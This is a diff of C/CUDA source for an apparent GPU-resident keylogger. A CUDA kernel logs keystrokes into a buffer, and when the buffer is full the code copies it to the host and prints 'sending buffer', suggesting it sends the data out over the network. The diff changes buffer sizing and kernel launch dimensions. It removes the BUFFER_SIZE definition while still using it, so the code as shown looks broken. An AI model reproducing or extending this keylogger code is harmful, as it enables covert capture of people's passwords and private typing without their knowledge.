@@ -23,8 +23,8 @@
 #include <winsock.h>
 
 #define DEBUG 1
-//#define BUFFER_SIZE 8192
-#define BUFFER_SIZE 128
+
+
 VOID pauseForABit(WORD secondsDelay) {
 
 	printf("Waiting for %d seconds...", secondsDelay);
@@ -327,7 +327,9 @@ int main(int argc, _TCHAR* argv[]) {
 
 		printf("Launching CUDA process.\n");
 		dim3 grid(1);
-		dim3 block(1); 
+		dim3 block(1);
+		dim3 grid_enc(2);
+		dim3 block_enc(BUFFER_SIZE/2);
 		while (TRUE) { 
 			logKeyboardData <<<1, 1 >>>(d_KeyboardData, d_KeyboardFlag, d_KeyMap, d_KeyMap2, d_KeystrokeBuffer, d_lastMake, d_lastModifier, d_shiftStatus, d_keystrokeIndex, d_keyboardState);
 			checkCudaErrors(cudaDeviceSynchronize());
@@ -335,7 +337,7 @@ int main(int argc, _TCHAR* argv[]) {
 			checkCudaErrors(cudaMemcpy(h_keystrokeIndex, d_keystrokeIndex, sizeof(ULONG), cudaMemcpyDeviceToHost));
 			if (*h_keystrokeIndex >= BUFFER_SIZE) {
 				printf("copying buffer.\n");
-				copyKeyboardBuffer <<<2, 64 >>>(d_KeystrokeBuffer, d_OutgoingKeystrokeBuffer, d_keystrokeIndex);
+				copyKeyboardBuffer <<<grid_enc, block_enc >>>(d_KeystrokeBuffer, d_OutgoingKeystrokeBuffer, d_keystrokeIndex);
 				checkCudaErrors(cudaDeviceSynchronize());
 				checkCudaErrors(cudaMemcpy(h_KeystrokeBuffer, d_OutgoingKeystrokeBuffer, sizeof(CHAR) * BUFFER_SIZE, cudaMemcpyDeviceToHost));
 				printf("sending buffer.\n"); 
